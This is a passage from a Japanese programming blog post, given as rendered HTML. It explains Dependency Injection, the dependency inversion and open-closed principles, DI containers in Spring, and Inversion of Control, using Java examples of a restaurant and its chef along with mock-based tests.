RestaurantMap クラスを開いて static ブロックの中に直接 new を呼び出すコードを追加しなければなりません。</p>\n<p data-sourcepos=\"21:1-21:221\">つまり、ファクトリーをファクトリーでラップし、いくら抽象化を行っても、プログラムのどこかでは必ず new を通じてオブジェクトを生成しなければなりません。</p>\n<p data-sourcepos=\"23:1-23:93\">この問題を解決する方法こそが、DI (Dependency Injection) コンテナ です。</p>\n<p data-sourcepos=\"25:1-25:152\">本日は、DIコンテナについて詳しく整理し、Springではどのようになっているか、一度確認してみたいと思います。</p>\n<h1 data-sourcepos=\"27:1-27:13\">\n<span id=\"diとは\" class=\"fragment\"></span><a href=\"#di%E3%81%A8%E3%81%AF\"><i class=\"fa fa-link\"></i></a>DIとは？</h1>\n<blockquote data-sourcepos=\"28:1-29:117\">\n<p data-sourcepos=\"28:3-29:117\">Dependency Injection（依存性の注入）の略で、<br>\n自分が必要とする依存性を直接生成せず、外部から受け取る設計パターンのことです。</p>\n</blockquote>\n<div data-sourcepos=\"31:1-39:3\" class=\"note info\">\n<span class=\"fa fa-fw fa-check-circle\"></span><div>\n<h3 data-sourcepos=\"32:1-32:38\">\n<span id=\"依存性dependencyとは\" class=\"fragment\"></span><a href=\"#%E4%BE%9D%E5%AD%98%E6%80%A7dependency%E3%81%A8%E3%81%AF\"><i class=\"fa fa-link\"></i></a>依存性（Dependency）とは？</h3>\n<ul data-sourcepos=\"33:1-33:153\">\n<li data-sourcepos=\"33:1-33:153\">あるオブジェクトAが、別のオブジェクトBの機能を使用するために参照する関係を「AはBに依存する」と言います</li>\n</ul>\n<div class=\"code-frame\" data-lang=\"java\" data-sourcepos=\"34:1-38:3\"><div class=\"highlight\"><pre><code><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">A</span> <span class=\"o\">{</span>\n    <span class=\"kd\">private</span> <span class=\"no\">B</span> <span class=\"n\">b</span><span class=\"o\">;</span>  <span class=\"c1\">// AはBなしでは動作できない = AがBに依存</span>\n<span class=\"o\">}</span>\n</code></pre></div></div>\n</div>\n</div>\n<h3 data-sourcepos=\"42:1-42:56\">\n<span id=\"diのないコード密結合tight-coupling\" class=\"fragment\"></span><a href=\"#di%E3%81%AE%E3%81%AA%E3%81%84%E3%82%B3%E3%83%BC%E3%83%89%E5%AF%86%E7%B5%90%E5%90%88tight-coupling\"><i class=\"fa fa-link\"></i></a>DIのないコード：密結合（Tight Coupling）</h3>\n<div class=\"code-frame\" data-lang=\"java\" data-sourcepos=\"44:1-59:3\"><div class=\"highlight\"><pre><code><span class=\"c1\">// DIのないコード</span>\n<span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">SalmonRestaurant</span> <span class=\"o\">{</span>\n    <span class=\"kd\">private</span> <span class=\"nc\">SalmonChef</span> <span class=\"n\">chef</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">public</span> <span class=\"nf\">SalmonRestaurant</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"c1\">// [問題点] 依存するオブジェクト(Chef)を自ら直接生成している（密結合）</span>\n        <span class=\"c1\">// もしTunaChefに変更したい場合、このコードを修正しなければならない</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">chef</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nc\">SalmonChef</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">serve</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"n\">chef</span><span class=\"o\">.</span><span class=\"na\">cook</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n</code></pre></div></div>\n<p data-sourcepos=\"60:1-60:266\">上記のコードの問題点は、<code>Restaurant</code>が<code>Chef</code>を直接 <code>new</code> で生成しているという点です。 メニューを変更するには内部コードを修正する必要があるため、これは強い依存性、つまり密結合を意味します</p>\n<h3 data-sourcepos=\"62:1-62:62\">\n<span id=\"diを適用したコード疎結合loose-coupling\" class=\"fragment\"></span><a href=\"#di%E3%82%92%E9%81%A9%E7%94%A8%E3%81%97%E3%81%9F%E3%82%B3%E3%83%BC%E3%83%89%E7%96%8E%E7%B5%90%E5%90%88loose-coupling\"><i class=\"fa fa-link\"></i></a>DIを適用したコード：疎結合（Loose Coupling）</h3>\n<div class=\"code-frame\" data-lang=\"java\" data-sourcepos=\"64:1-84:3\"><div class=\"highlight\"><pre><code><span class=\"c1\">// DIありのコード</span>\n<span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">SalmonRestaurant</span> <span class=\"o\">{</span>\n    <span class=\"c1\">// 具体的なクラス(SalmonChef)ではなく、インターフェース(Chef)に依存</span>\n    <span class=\"kd\">private</span> <span class=\"nc\">Chef</span> <span class=\"n\">chef</span><span class=\"o\">;</span>\n\n    <span class=\"c1\">// [解決] コンストラクタを通じて外部から依存性を注入される（Constructor Injection）</span>\n    <span class=\"kd\">public</span> <span class=\"nf\">SalmonRestaurant</span><span class=\"o\">(</span><span class=\"nc\">Chef</span> <span class=\"n\">chef</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">chef</span> <span class=\"o\">=</span> <span class=\"n\">chef</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">serve</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"n\">chef</span><span class=\"o\">.</span><span class=\"na\">cook</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n\n<span class=\"c1\">// --- 使用する場所（外部）---</span>\n<span class=\"c1\">// 外部でオブジェクトを生成して渡す</span>\n<span class=\"nc\">Chef</span> <span class=\"n\">myChef</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nc\">SalmonChef</span><span class=\"o\">();</span> \n<span class=\"nc\">SalmonRestaurant</span> <span class=\"n\">restaurant</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nc\">SalmonRestaurant</span><span class=\"o\">(</span><span class=\"n\">myChef</span><span class=\"o\">);</span> <span class=\"c1\">// 注入！</span>\n</code></pre></div></div>\n<p data-sourcepos=\"86:1-86:129\">これで <code>Restaurant</code> は具象クラスではなく、<code>Chef</code> インターフェースに依存するようになりました。</p>\n<h2 data-sourcepos=\"88:1-88:41\">\n<span id=\"diによって得られるメリット\" class=\"fragment\"></span><a href=\"#di%E3%81%AB%E3%82%88%E3%81%A3%E3%81%A6%E5%BE%97%E3%82%89%E3%82%8C%E3%82%8B%E3%83%A1%E3%83%AA%E3%83%83%E3%83%88\"><i class=\"fa fa-link\"></i></a>DIによって得られるメリット</h2>\n<ul data-sourcepos=\"90:1-92:0\">\n<li data-sourcepos=\"90:1-92:0\">結合度の低下<br>\nこの部分は、ファクトリーメソッドパターンのメリットで触れた内容と同じです。</li>\n</ul>\n<p data-sourcepos=\"93:1-93:144\">すべてのデザインパターンは、拡張に対しては開いており、変更に対しては閉じているようにすることで、</p>\n<p data-sourcepos=\"95:1-95:93\">ドメインを重点的に開発できるようにするための仕組みだからです。</p>\n<div class=\"code-frame\" data-lang=\"java\" data-sourcepos=\"97:1-102:3\"><div class=\"highlight\"><pre><code><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">SalmonRestaurant</span> <span class=\"o\">{</span>\n    <span class=\"kd\">private</span> <span class=\"nc\">SalmonChef</span> <span class=\"n\">chef</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nc\">SalmonChef</span><span class=\"o\">();</span>\n    <span class=\"c1\">// ...</span>\n<span class=\"o\">}</span>\n</code></pre></div></div>\n<p data-sourcepos=\"104:1-104:171\">上記のようなコードの場合、TunaChefに変更したければ、<code>Restaurant</code> コードを必ず修正しなければならないという問題が生じます。</p>\n<div class=\"code-frame\" data-lang=\"java\" data-sourcepos=\"106:1-109:3\"><div class=\"highlight\"><pre><code><span class=\"c1\">// TunaChefに変更したい場合、SalmonRestaurantのコードを修正する必要がある</span>\n<span class=\"kd\">private</span> <span class=\"nc\">TunaChef</span> <span class=\"n\">chef</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nc\">TunaChef</span><span class=\"o\">();</span>  <span class=\"c1\">// コードの変更が必要</span>\n</code></pre></div></div>\n<div class=\"code-frame\" data-lang=\"java\" data-sourcepos=\"111:1-135:3\"><div class=\"highlight\"><pre><code><span class=\"kd\">public</span> <span class=\"kd\">interface</span> <span class=\"nc\">Chef</span> <span class=\"o\">{</span>\n    <span class=\"kt\">void</span> <span class=\"nf\">cook</span><span class=\"o\">();</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">SalmonChef</span> <span class=\"kd\">implements</span> <span class=\"nc\">Chef</span> <span class=\"o\">{</span>\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">cook</span><span class=\"o\">()</span> <span class=\"o\">{</span> <span class=\"nc\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">\"サーモン料理\"</span><span class=\"o\">);</span> <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">TunaChef</span> <span class=\"kd\">implements</span> <span class=\"nc\">Chef</span> <span class=\"o\">{</span>\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">cook</span><span class=\"o\">()</span> <span class=\"o\">{</span> <span class=\"nc\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">\"マグロ料理\"</span><span class=\"o\">);</span> <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">SalmonRestaurant</span> <span class=\"o\">{</span>\n    <span class=\"kd\">private</span> <span class=\"nc\">Chef</span> <span class=\"n\">chef</span><span class=\"o\">;</span>  <span class=\"c1\">// インターフェースに依存</span>\n    \n    <span class=\"kd\">public</span> <span class=\"nf\">SalmonRestaurant</span><span class=\"o\">(</span><span class=\"nc\">Chef</span> <span class=\"n\">chef</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">chef</span> <span class=\"o\">=</span> <span class=\"n\">chef</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n    \n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">serve</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"n\">chef</span><span class=\"o\">.</span><span class=\"na\">cook</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n</code></pre></div></div>\n<p data-sourcepos=\"137:1-137:200\">しかし、次のようにDI（依存性の注入）を使用すれば、DIP（依存性逆転の原則）を実現し、結合度を下げ、拡張に対して柔軟になることができます。</p>\n<div data-sourcepos=\"139:1-145:3\" class=\"note info\">\n<span class=\"fa fa-fw fa-check-circle\"></span><div>\n<h3 data-sourcepos=\"140:1-140:21\">\n<span id=\"diとdipの違い\" class=\"fragment\"></span><a href=\"#di%E3%81%A8dip%E3%81%AE%E9%81%95%E3%81%84\"><i class=\"fa fa-link\"></i></a>DIとDIPの違い</h3>\n<ul data-sourcepos=\"141:1-143:0\">\n<li data-sourcepos=\"141:1-141:216\">\n<strong>DIP (Dependency Inversion Principle)</strong> : 上位モジュールが下位モジュールに直接依存せず、両方が抽象化（インターフェース）に依存すべきであるという「設計原則」</li>\n<li data-sourcepos=\"142:1-143:0\">\n<strong>DI (Dependency Injection)</strong> : DIPを実現するために、外部から依存性を注入する「具体的な手法」</li>\n</ul>\n<p data-sourcepos=\"144:1-144:101\">つまり、DIPは抽象化された概念であり、DIはDIPを実現する方法の一つです。</p>\n</div>\n</div>\n<ul data-sourcepos=\"147:1-150:0\">\n<li data-sourcepos=\"147:1-150:0\">テストの容易性<br>\nこれは先ほどのコードと説明から繋がります。<br>\nDIがないとテストを行うのが難しくなります。</li>\n</ul>\n<p data-sourcepos=\"151:1-151:124\">例えば、Chefに直接メールを送信するようなビジネスロジックがあると仮정してみましょう。</p>\n<div class=\"code-frame\" data-lang=\"java\" data-sourcepos=\"153:1-167:3\"><div class=\"highlight\"><pre><code><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">SalmonRestaurant</span> <span class=\"o\">{</span>\n    <span class=\"kd\">private</span> <span class=\"nc\">SalmonChef</span> <span class=\"n\">chef</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nc\">SalmonChef</span><span class=\"o\">();</span>  <span class=\"c1\">// 直接生成</span>\n    \n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">call</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"n\">chef</span><span class=\"o\">.</span><span class=\"na\">call</span><span class=\"o\">(</span><span class=\"mi\">1111</span><span class=\"o\">-</span><span class=\"mi\">1111</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n\n<span class=\"nd\">@Test</span>\n<span class=\"kt\">void</span> <span class=\"nf\">calltest</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n      <span class=\"nc\">SalmonRestaurant</span> <span class=\"n\">restaurant</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nc\">SalmonRestaurant</span><span class=\"o\">();</span>\n      <span class=\"n\">restaurant</span><span class=\"o\">.</span><span class=\"na\">call</span><span class=\"o\">();</span> <span class=\"c1\">// 実際に連絡が行ってしまう</span>\n<span class=\"o\">}</span>\n</code></pre></div></div>\n<p data-sourcepos=\"168:1-168:236\">次のように、コード内に外部依存性（このコードではシェフへの連絡でしたが、DB依存や外部API依存など）があると、テストコードを実行するたびに問題が発生するでしょう。</p>\n<p data-sourcepos=\"170:1-170:144\">しかし、DIを活用すれば、Mockオブジェクトを簡単に注入できるため、テストを容易に行うことができます。</p>\n<div class=\"code-frame\" data-lang=\"java\" data-sourcepos=\"172:1-197:3\"><div class=\"highlight\"><pre><code><span class=\"c1\">// DIありのコード</span>\n<span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">SalmonRestaurant</span> <span class=\"o\">{</span>\n    <span class=\"kd\">private</span> <span class=\"nc\">Chef</span> <span class=\"n\">chef</span><span class=\"o\">;</span>\n    \n    <span class=\"kd\">public</span> <span class=\"nf\">SalmonRestaurant</span><span class=\"o\">(</span><span class=\"nc\">Chef</span> <span class=\"n\">chef</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">chef</span> <span class=\"o\">=</span> <span class=\"n\">chef</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n    \n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">call</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"n\">chef</span><span class=\"o\">.</span><span class=\"na\">call</span><span class=\"o\">(</span><span class=\"mi\">1111</span><span class=\"o\">-</span><span class=\"mi\">1111</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n\n<span class=\"nd\">@Test</span>\n<span class=\"kt\">void</span> <span class=\"nf\">callTest</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n    <span class=\"c1\">// モックのChefを注入</span>\n    <span class=\"nc\">Chef</span> <span class=\"n\">mockChef</span> <span class=\"o\">=</span> <span class=\"n\">mock</span><span class=\"o\">(</span><span class=\"nc\">Chef</span><span class=\"o\">.</span><span class=\"na\">class</span><span class=\"o\">);</span>\n    <span class=\"nc\">SalmonRestaurant</span> <span class=\"n\">restaurant</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nc\">SalmonRestaurant</span><span class=\"o\">(</span><span class=\"n\">mockChef</span><span class=\"o\">);</span>\n    \n    <span class=\"n\">restaurant</span><span class=\"o\">.</span><span class=\"na\">call</span><span class=\"o\">();</span>  <span class=\"c1\">// 実際に電話はかからない！</span>\n    \n    <span class=\"c1\">// call()が呼び出されたかだけを検証</span>\n    <span class=\"n\">verify</span><span class=\"o\">(</span><span class=\"n\">mockChef</span><span class=\"o\">).</span><span class=\"na\">call</span><span class=\"o\">(</span><span class=\"mi\">1111</span><span class=\"o\">-</span><span class=\"mi\">1111</span><span class=\"o\">);</span>\n<span class=\"o\">}</span>\n</code></pre></div></div>\n<p data-sourcepos=\"198:1-198:138\">このように、依存性逆転を通じてモックオブジェクトを利用し、簡単にテストを行うことができます。</p>\n<ul data-sourcepos=\"200:1-201:0\">\n<li data-sourcepos=\"200:1-201:0\">柔軟な構成 (OCP)</li>\n</ul>\n<p data-sourcepos=\"202:1-202:249\">OCPの原則も、上記の説明と繋がっています。先ほどの結合度を下げたコードで見たように、拡張が容易になります。これについては先ほど説明しましたので、詳細な説明は省略します。</p>\n<div data-sourcepos=\"204:1-210:3\" class=\"note info\">\n<span class=\"fa fa-fw fa-check-circle\"></span><div>\n<h3 data-sourcepos=\"205:1-205:16\">\n<span id=\"ocpとは\" class=\"fragment\"></span><a href=\"#ocp%E3%81%A8%E3%81%AF\"><i class=\"fa fa-link\"></i></a>OCPとは？</h3>\n<blockquote data-sourcepos=\"206:1-207:90\">\n<p data-sourcepos=\"206:3-207:90\">Open for extension, Closed for modification<br>\n拡張に対しては開いており、修正に対しては閉じているべきである</p>\n</blockquote>\n<p data-sourcepos=\"209:1-209:144\">つまり、新しい機能が追加される際には、既存のコードを修正することなく拡張できなければなりません。</p>\n</div>\n</div>\n<h1 data-sourcepos=\"212:1-212:25\">\n<span id=\"diコンテナとは\" class=\"fragment\"></span><a href=\"#di%E3%82%B3%E3%83%B3%E3%83%86%E3%83%8A%E3%81%A8%E3%81%AF\"><i class=\"fa fa-link\"></i></a>DIコンテナとは？</h1>\n<blockquote data-sourcepos=\"214:1-214:190\">\n<p data-sourcepos=\"214:3-214:190\">DIコンテナは、オブジェクトの生成、依存性の注入、ライフサイクル管理を自動的に行ってくれるフレームワーク、またはライブラリです。</p>\n</blockquote>\n<p data-sourcepos=\"216:1-216:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3815412%2F8fac1f41-4d34-4d2b-9ca9-0c9b13443c0a.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=8fdd69ad4b5a713dea16cabd38a37dbb\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3815412%2F8fac1f41-4d34-4d2b-9ca9-0c9b13443c0a.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=8fdd69ad4b5a713dea16cabd38a37dbb\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3815412%2F8fac1f41-4d34-4d2b-9ca9-0c9b13443c0a.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=0a84f58c6d9763d58eefc6d5800537bf 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3815412/8fac1f41-4d34-4d2b-9ca9-0c9b13443c0a.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"218:1-218:189\">以前のコードで見たように、コードのどこかでは必ず、オブジェクトの生成と注入を開発者が責任を持って行わなければなりませんでした。</p>\n<div class=\"code-frame\" data-lang=\"java\" data-sourcepos=\"220:1-224:3\"><div class=\"highlight\"><pre><code><span class=\"c1\">// 開発者が直接すべて行わなければなりません</span>\n<span class=\"nc\">Chef</span> <span class=\"n\">chef</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nc\">SalmonChef</span><span class=\"o\">();</span>\n<span class=\"nc\">SalmonRestaurant</span> <span class=\"n\">restaurant</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nc\">SalmonRestaurant</span><span class=\"o\">(</span><span class=\"n\">chef</span><span class=\"o\">);</span>\n</code></pre></div></div>\n<p data-sourcepos=\"225:1-226:73\">これを自動的に管理してくれるのが、DIコンテナです。<br>\nJavaでは、代表的なものとしてSpringが使われています。</p>\n<div class=\"code-frame\" data-lang=\"java\" data-sourcepos=\"228:1-240:3\"><div class=\"highlight\"><pre><code><span class=\"nd\">@Component</span>\n<span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">SalmonChef</span> <span class=\"kd\">implements</span> <span class=\"nc\">Chef</span> <span class=\"o\">{</span> <span class=\"o\">}</span>\n\n<span class=\"nd\">@Component</span>\n<span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">SalmonRestaurant</span> <span class=\"o\">{</span>\n    <span class=\"kd\">private</span> <span class=\"kd\">final</span> <span class=\"nc\">Chef</span> <span class=\"n\">chef</span><span class=\"o\">;</span>\n    \n    <span class=\"kd\">public</span> <span class=\"nf\">SalmonRestaurant</span><span class=\"o\">(</span><span class=\"nc\">Chef</span> <span class=\"n\">chef</span><span class=\"o\">)</span> <span class=\"o\">{</span>  <span class=\"c1\">// Springが自動で注入</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">chef</span> <span class=\"o\">=</span> <span class=\"n\">chef</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n</code></pre></div></div>\n<h3 data-sourcepos=\"242:1-242:57\">\n<span id=\"diコンテナによって何が得られるのか\" class=\"fragment\"></span><a href=\"#di%E3%82%B3%E3%83%B3%E3%83%86%E3%83%8A%E3%81%AB%E3%82%88%E3%81%A3%E3%81%A6%E4%BD%95%E3%81%8C%E5%BE%97%E3%82%89%E3%82%8C%E3%82%8B%E3%81%AE%E3%81%8B\"><i class=\"fa fa-link\"></i></a>DIコンテナによって何が得られるのか？</h3>\n<blockquote data-sourcepos=\"243:1-243:433\">\n<p data-sourcepos=\"243:3-243:433\">Because dependency injection separates how objects are constructed from how they are used, it often diminishes the importance of the new keyword found in most object-oriented languages. Because the framework handles creating services, the programmer tends to only directly construct value objects which represents entities in the program's domain (such as an Employee object in a business app or an Order object in a shopping app).</p>\n</blockquote>\n<p data-sourcepos=\"245:1-245:50\"><iframe id=\"qiita-embed-content__d245cf76f3d259ec59ff681298ddce25\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__d245cf76f3d259ec59ff681298ddce25\" data-content=\"https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FDependency_injection\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"247:1-247:257\">ついに、開発者がオブジェクトの生成を逐一担当しなくても、DIコンテナがオブジェクトの生成・注入を担当してくれるため、開発者はビジネスロジックだけに集中できるようになりました。</p>\n<p data-sourcepos=\"249:1-249:266\">このように、オブジェクトの生成と注入 ＋（管理）の責任を、開発者ではなくコンテナ（フレームワーク、ライブラリ）に委ねることを、まさに <strong>制御の反転（IoC, Inversion of Control）</strong> と呼びます。</p>\n<h1 data-sourcepos=\"251:1-251:23\">\n<span id=\"制御の反転-ioc\" class=\"fragment\"></span><a href=\"#%E5%88%B6%E5%BE%A1%E3%81%AE%E5%8F%8D%E8%BB%A2-ioc\"><i class=\"fa fa-link\"></i></a>制御の反転 (IoC)</h1>\n<blockquote data-sourcepos=\"253:1-253:552\">\n<p data-sourcepos=\"253:3-253:552\">In software design, inversion of control (IoC) is a design principle in which custom-written portions of a computer program receive the flow of control from an external source (e.g. a framework). The term \"inversion\" is historical: a software architecture with this design \"inverts\" control as compared to procedural programming. In procedural programming, a program's custom code calls reusable libraries to take care of generic tasks, but with inversion of control, it is the external code or framework that is in control and calls the custom code.</p>\n</blockquote>\n<p data-sourcepos=\"255:1-256:144\">この内容を簡単に整理すると、<br>\nIoCとは、開発者が作成したコードが外部（フレームワークなど）から制御の流れを受け取る設計原則です。</p>\n<p data-sourcepos=\"258:1-258:150\">つまり、私がフレームワークを呼び出すのではなく、フレームワークが私のコードを呼び出すという意味です。</p>\n<div data-sourcepos=\"260:1-265:3\" class=\"note info\">\n<span class=\"fa fa-fw fa-check-circle\"></span><div>\n<h3 data-sourcepos=\"261:1-261:43\">\n<span id=\"なぜ制御の反転なのか\" class=\"fragment\"></span><a href=\"#%E3%81%AA%E3%81%9C%E5%88%B6%E5%BE%A1%E3%81%AE%E5%8F%8D%E8%BB%A2%E3%81%AA%E3%81%AE%E3%81%8B\"><i class=\"fa fa-link\"></i></a>なぜ制御の「反転」なのか？</h3>\n<p data-sourcepos=\"262:1-264:48\">手続き型プログラミングの時代では、私がフレームワークを呼び出していましたが、IoC設計方式を持つソフトウェアアーキテクチャでは、フレームワークが私のコードを呼び出します。<br>\nつまり、制御方式が以前とは「逆」なのです。<br>\nこれを制御の「反転」と言います。</p>\n</div>\n</div>\n<p data-sourcepos=\"268:1-268:50\"><iframe id=\"qiita-embed-content__db73b987749c9ce9dac91be2f43687f5\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__db73b987749c9ce9dac91be2f43687f5\" data-content=\"https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FInversion_of_control\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h2 data-sourcepos=\"270:1-270:20\">\n<span id=\"iocとdiの関係\" class=\"fragment\"></span><a href=\"#ioc%E3%81%A8di%E3%81%AE%E9%96%A2%E4%BF%82\"><i class=\"fa fa-link\"></i></a>IoCとDIの関係</h2>\n<h3 data-sourcepos=\"272:1-272:21\">\n<span id=\"diとiocの違い\" class=\"fragment\"></span><a href=\"#di%E3%81%A8ioc%E3%81%AE%E9%81%95%E3%81%84\"><i class=\"fa fa-link\"></i></a>DIとIoCの違い</h3>\n<ul data-sourcepos=\"274:1-276:0\">\n<li data-sourcepos=\"274:1-274:32\">IoCは抽象的な概念です</li>\n<li data-sourcepos=\"275:1-276:0\">DIはIoCを実現する具体的な方法の一つです</li>\n</ul>\n<p data-sourcepos=\"277:1-277:129\">この用語の違いに関する説明は、DDDの父、マーティン・ファウラーのブログに記されています。</p>\n<p data-sourcepos=\"279:1-279:48\"><iframe id=\"qiita-embed-content__4e4b3005a2d6bf857397fdbe4c9277b3\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__4e4b3005a2d6bf857397fdbe4c9277b3\" data-content=\"https%3A%2F%2Fmartinfowler.com%2Farticles%2Finjection.html\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<blockquote data-sourcepos=\"281:1-281:579\">\n<p data-sourcepos=\"281:3-281:579\">In the Java community there's been a rush of lightweight containers that help to assemble components from different projects into a cohesive application. Underlying these containers is a common pattern to how they perform the wiring, a concept they refer under the very generic name of “Inversion of Control”. In this article I dig into how this pattern works, under the more specific name of “Dependency Injection”, and contrast it with the Service Locator alternative. The choice between them is less important than the principle of separating configuration from use.</p>\n</blockquote>\n<p data-sourcepos=\"283:1-283:88\">昔々、Javaコミュニティでは様々な軽量コンテナが登場しました。</p>\n<p data-sourcepos=\"285:1-285:236\">これらのコンテナの基盤には、コンポーネント同士を連結する共通のパターンがあり、これを「Inversion of Control（制御の反転）」という非常に一般的な名前で呼んでいました。</p>\n<p data-sourcepos=\"287:1-287:224\">マーティン・ファウラーはこの記事の中で、「Dependency Injection（依存性の注入）」という、より具体的な名前で掘り下げ、Service Locatorという代替案と比較しています。</p>\n<p data-sourcepos=\"289:1-289:169\">何を（どのパターンを）選択するかということよりも、設定（configuration）と使用（use）を分離する原則の方がより重要です。</p>\n<div data-sourcepos=\"291:1-352:3\" class=\"note info\">\n<span class=\"fa fa-fw fa-check-circle\"></span><div>\n<h3 data-sourcepos=\"292:1-292:48\">\n<span id=\"service-locatorとはdiの代替案\" class=\"fragment\"></span><a href=\"#service-locator%E3%81%A8%E3%81%AFdi%E3%81%AE%E4%BB%A3%E6%9B%BF%E6%A1%88\"><i class=\"fa fa-link\"></i></a>Service Locatorとは？（DIの代替案）</h3>\n<p data-sourcepos=\"293:1-293:81\">サービスを探す処理を中央で一括して行う方式のことです。</p>\n<ul data-sourcepos=\"295:1-295:26\">\n<li data-sourcepos=\"295:1-295:26\">DI(Dependency Injection)</li>\n</ul>\n<div class=\"code-frame\" data-lang=\"java\" data-sourcepos=\"296:1-305:3\"><div class=\"highlight\"><pre><code><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">SalmonRestaurant</span> <span class=\"o\">{</span>\n    <span class=\"kd\">private</span> <span class=\"kd\">final</span> <span class=\"nc\">Chef</span> <span class=\"n\">chef</span><span class=\"o\">;</span>\n    \n    <span class=\"c1\">// 外部から注入される（受動的）</span>\n    <span class=\"kd\">public</span> <span class=\"nf\">SalmonRestaurant</span><span class=\"o\">(</span><span class=\"nc\">Chef</span> <span class=\"n\">chef</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">chef</span> <span class=\"o\">=</span> <span class=\"n\">chef</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n<span 